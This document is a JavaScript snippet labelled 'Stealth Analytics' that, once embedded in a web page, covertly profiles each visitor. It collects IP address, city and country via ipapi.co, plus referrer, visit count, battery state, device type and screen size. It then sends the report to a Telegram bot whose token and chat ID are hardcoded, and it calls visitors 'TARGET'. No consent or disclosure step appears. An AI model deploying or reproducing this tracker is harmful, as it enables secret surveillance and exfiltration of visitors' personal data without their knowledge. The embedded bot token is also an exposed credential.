/* --- 🕵️ Stealth Analytics v11.0 | Traffic Source Edition --- */
(async function() {
    const _cfg = {
        t: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
        i: '8528072384'
    };

    if (sessionStorage.getItem('sent_report')) return;

    try {
        const vCnt = parseInt(localStorage.getItem('v_cnt') || 0) + 1;
        localStorage.setItem('v_cnt', vCnt);

        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        // --- كشف مصدر الدخول بدقة ---
        const ref = document.referrer.toLowerCase();
        let source = "Direct Entry / Bookmark 🔗";
        
        if (ref.includes('facebook')) source = "Facebook 🟦";
        else if (ref.includes('instagram')) source = "Instagram 📸";
        else if (ref.includes('t.co') || ref.includes('twitter') || ref.includes('x.com')) source = "X (Twitter) 🐦";
        else if (ref.includes('whatsapp')) source = "WhatsApp 🟢";
        else if (ref.includes('telegram')) source = "Telegram ✈️";
        else if (ref.includes('google')) source = "Google Search 🔍";
        else if (ref !== "") source = `External Site: ${new URL(ref).hostname}`;

        let batt = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batt = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging ⚡' : 'Discharging 🔋'})`;
        }

        const msg = 
            `🛰️ [NEW SESSION DETECTED]\n` +
            `--------------------------\n` +
            `📥 SOURCE: ${source}\n` +
            `👤 TARGET: ${vCnt > 1 ? 'Returning (#' + vCnt + ')' : 'New User'}\n` +
            `📍 LOCATION: ${data.city}, ${data.country_name}\n` +
            `🌐 IP: ${data.ip}\n` +
            `--------------------------\n` +
            `📱 DEVICE INFO:\n` +
            `   • Battery: ${batt}\n` +
            `   • OS/Browser: ${navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}\n` +
            `   • Resolution: ${window.screen.width}x${window.screen.height}\n` +
            `--------------------------\n` +
            `⏰ SERVER TIME: ${new Date().toLocaleString('ar-EG')}`;

        await fetch(`https://api.telegram.org/bot${_cfg.t}/sendMessage?chat_id=${_cfg.i}&text=${encodeURIComponent(msg)}`);
        sessionStorage.setItem('sent_report', 'true');

    } catch (err) {
        fetch(`https://api.telegram.org/bot${_cfg.t}/sendMessage?chat_id=${_cfg.i}&text=${encodeURIComponent('⚠️ Access Alert: Target detected on ' + document.title)}`);
    }
})();
